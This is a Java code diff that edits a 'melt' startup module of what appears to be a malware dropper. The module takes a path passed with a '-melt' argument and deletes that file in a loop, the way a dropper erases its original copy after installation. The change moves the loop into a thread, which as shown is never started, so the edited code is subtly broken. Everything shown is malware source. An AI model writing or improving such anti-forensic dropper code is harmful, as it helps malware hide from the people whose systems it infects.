@@ -12,27 +12,30 @@ public class MeltDropperStartupModule extends StartupModule {
 	}
 
 	public void run() throws Exception {
-		File filetodelete = null;	
+		File file = null;	
 
 		if (Main.args.length > 0) {
 			if (Main.args[0].trim().equals("-melt")) {
 				String path = Main.args[1];
-				filetodelete = new File(path.replace("\"", "").trim());
+				file = new File(path.replace("\"", "").trim());
 			}
 		}
 		
-		if (filetodelete != null) {
-			while (filetodelete.exists()) {
-				try {
-					filetodelete.delete();
-				} catch (Exception ex) {
-					try {
-						Thread.sleep(1000L);
-					} finally {
+		final File finalFile = file;
+		
+		new Thread(new Runnable() {
+			public void run() {
+				if (finalFile != null) {
+					while (!finalFile.delete()) {
+						try {
+							Thread.sleep(100L);
+						} catch (Exception ex) {
+							ex.printStackTrace();
+						}
 					}
 				}
 			}
-		}
+		});
 	}
 
 }
